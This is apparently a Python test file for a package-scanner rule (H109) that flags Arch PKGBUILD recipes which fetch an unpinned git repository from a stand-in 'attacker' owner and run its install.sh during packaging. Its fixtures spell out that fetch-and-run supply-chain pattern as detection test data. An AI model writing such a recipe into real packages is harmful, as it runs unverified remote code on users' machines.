"""H109: a build helper is executed from a secondary source."""

from trustsight.analysis.secondary import secondary_source_execution_finding

RECIPE = """pkgname=demo
pkgver=1
pkgrel=1
url=https://github.com/upstream/project
source=('git+https://github.com/{owner}/patch.git')
sha256sums=('SKIP')
package() {{
  cd "$srcdir"
  bash patch/install.sh
}}
"""


def _finding(owner="attacker", rule="H094", path="patch/install.sh",
             recipe=None):
    return secondary_source_execution_finding(
        package_name="demo",
        findings=[{"rule_id": rule, "path": path}],
        diff_text="",
        recipe_text=recipe if recipe is not None else RECIPE.format(owner=owner),
    )


def test_h109_fires_on_an_unpinned_secondary_source():
    result = _finding()
    assert result is not None
    assert result["rule_id"] == "H109"
    assert result["weight_override"] == 0
    assert "attacker/patch" in result["params"]["source"]


def test_h109_is_quiet_when_the_source_is_the_upstream_org():
    assert _finding(owner="upstream") is None


def test_h109_is_quiet_without_an_execution_sink():
    assert _finding(rule="H016") is None


def test_h109_is_quiet_without_a_declared_upstream():
    recipe = RECIPE.format(owner="attacker").replace(
        "url=https://github.com/upstream/project\n", "")
    assert _finding(recipe=recipe) is None


def test_h109_reaches_the_scan_pipeline():
    from trustsight.analysis.pipeline import scan_diff

    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,5 +1,9 @@
 pkgname=demo
 pkgver=1
 pkgrel=1
-url=https://github.com/upstream/project
-source=("https://example.invalid/old.tar.gz")
-sha256sums=('SKIP')
+url=https://github.com/upstream/project
+source=('git+https://github.com/attacker/patch.git')
+sha256sums=('SKIP')
+package() {
+  bash patch/install.sh
+}
"""
    fact = scan_diff(diff, package_name="demo")
    assert "H109" in {entry.rule_id for entry in fact.score_breakdown}
